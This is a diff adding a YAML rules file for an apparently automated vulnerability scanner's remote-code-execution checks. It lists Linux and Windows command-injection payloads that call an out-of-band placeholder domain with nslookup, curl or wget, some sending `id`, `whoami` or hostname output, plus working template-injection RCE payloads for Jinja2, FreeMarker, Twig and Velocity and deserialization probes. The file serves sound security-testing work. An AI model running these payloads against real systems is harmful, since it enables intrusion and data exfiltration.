@@ -1,0 +1,172 @@
+# knowledge/rules/rce_rules.yaml
+# SAM-∞ v28-Ω  Remote Code Execution (RCE) Detection Rules
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  vuln_type: rce
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "RCE 检测规则：命令注入、SSTI、反序列化；OAST 带外执行验证"
+
+default_oracle_pattern: ""
+oracle_type: "oast_dns_or_http"
+note: "RCE 验证：OAST 回调携带命令执行结果（如 `id` 输出）才算确认"
+
+# ── 命令注入 payload ────────────────────────────────────────────────────────────
+payloads:
+  # ── Linux 命令注入（OAST DNS 验证）────────────────────────────────────────
+  - payload: ";nslookup {correlation_id}.{oast_domain}"
+    oracle_type: oast_dns
+    platform: linux
+    confidence: 0.90
+    note: "分号注入"
+
+  - payload: "|nslookup {correlation_id}.{oast_domain}"
+    oracle_type: oast_dns
+    platform: linux
+    confidence: 0.90
+    note: "管道注入"
+
+  - payload: "&&nslookup {correlation_id}.{oast_domain}"
+    oracle_type: oast_dns
+    platform: linux
+    confidence: 0.88
+
+  - payload: "`nslookup {correlation_id}.{oast_domain}`"
+    oracle_type: oast_dns
+    platform: linux
+    confidence: 0.88
+    note: "反引号命令替换"
+
+  - payload: "$(nslookup {correlation_id}.{oast_domain})"
+    oracle_type: oast_dns
+    platform: linux
+    confidence: 0.87
+    note: "$() 命令替换"
+
+  # ── Linux 命令注入（OAST HTTP 验证，携带执行结果）──────────────────────────
+  - payload: ";curl http://{oast_domain}/{correlation_id}/$(id|base64 -w0)"
+    oracle_type: oast_http
+    platform: linux
+    confidence: 0.92
+    note: "HTTP 回调携带 id 命令执行结果（base64 编码）"
+
+  - payload: ";wget -q -O- http://{oast_domain}/{correlation_id}/$(whoami)"
+    oracle_type: oast_http
+    platform: linux
+    confidence: 0.90
+
+  - payload: ";curl http://{oast_domain}/$(hostname).{correlation_id}"
+    oracle_type: oast_http
+    platform: linux
+    confidence: 0.88
+
+  # ── Windows 命令注入（OAST DNS）────────────────────────────────────────────
+  - payload: "&nslookup {correlation_id}.{oast_domain}&"
+    oracle_type: oast_dns
+    platform: windows
+    confidence: 0.88
+
+  - payload: "|nslookup {correlation_id}.{oast_domain}|"
+    oracle_type: oast_dns
+    platform: windows
+    confidence: 0.88
+
+  - payload: "& ping -n 1 {correlation_id}.{oast_domain} &"
+    oracle_type: oast_dns
+    platform: windows
+    confidence: 0.85
+
+  # ── 时间延迟盲注验证（辅助）────────────────────────────────────────────────
+  - payload: ";sleep 5"
+    oracle_type: time_delay
+    platform: linux
+    confidence: 0.72
+    time_threshold_ms: 4500
+    note: "时间延迟单独不作为最终证明，需结合 OAST"
+
+  - payload: "| timeout 5"
+    oracle_type: time_delay
+    platform: windows
+    confidence: 0.70
+    time_threshold_ms: 4500
+
+# ── SSTI（服务端模板注入）payload ──────────────────────────────────────────────
+ssti:
+  detection:
+    - payload: "{{7*7}}"
+      oracle_pattern: "49"
+      engine: jinja2_or_twig
+      confidence: 0.88
+
+    - payload: "${7*7}"
+      oracle_pattern: "49"
+      engine: freemarker_or_el
+      confidence: 0.85
+
+    - payload: "<%= 7*7 %>"
+      oracle_pattern: "49"
+      engine: erb_or_ejs
+      confidence: 0.83
+
+    - payload: "#{7*7}"
+      oracle_pattern: "49"
+      engine: ruby_haml
+      confidence: 0.80
+
+    - payload: "{{7*'7'}}"
+      oracle_pattern: "7777777"
+      engine: jinja2
+      confidence: 0.90
+      note: "Jinja2 特有：字符串 × 整数 = 重复字符串"
+
+    - payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+      oracle_pattern: "uid="
+      engine: freemarker
+      oracle_type: differential_echo
+      confidence: 0.92
+      note: "FreeMarker RCE：升级为 RCE 级别漏洞"
+
+  rce_payloads:
+    jinja2:
+      - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      - "{{'id'|popen}}"
+      - "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}"
+
+    freemarker:
+      - "${\"/bin/sh\"?new()[\"exec\"]([\"id\"])}"
+      - "${\"freemarker.template.utility.Execute\"?new()(\"nslookup {oast_domain}\")}"
+
+    twig:
+      - "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+
+    velocity:
+      - "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($chr=$x.class.forName('java.lang.Character'))\n#set($str=$x.class.forName('java.lang.String'))\n#set($ex=$rt.getRuntime().exec('id'))"
+
+# ── 反序列化漏洞探测 ───────────────────────────────────────────────────────────
+deserialization:
+  java:
+    detection:
+      - description: "检测 Java 序列化对象（Base64 编码）"
+        pattern: "rO0AB"                    # Base64(0xaced 0x0005)，Java 序列化魔术字节
+        oracle: "OAST DNS 回调（ysoserial payload）"
+    tools:
+      - "ysoserial（生成 Java 反序列化 payload）"
+      - "marshalsec（RMI/LDAP redirect）"
+
+  php:
+    detection:
+      - description: "检测 PHP 序列化数据"
+        pattern: "O:\\d+:\""               # O:N:"classname":...
+        test_payload: 'O:8:"stdClass":0:{}'
+        oracle: "响应包含 PHP 类名或错误"
+
+  python_pickle:
+    detection:
+      - description: "检测 Python Pickle 数据"
+        pattern: "\\x80\\x02"              # Pickle protocol 2 magic
+        oracle: "OAST DNS 回调"
+
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
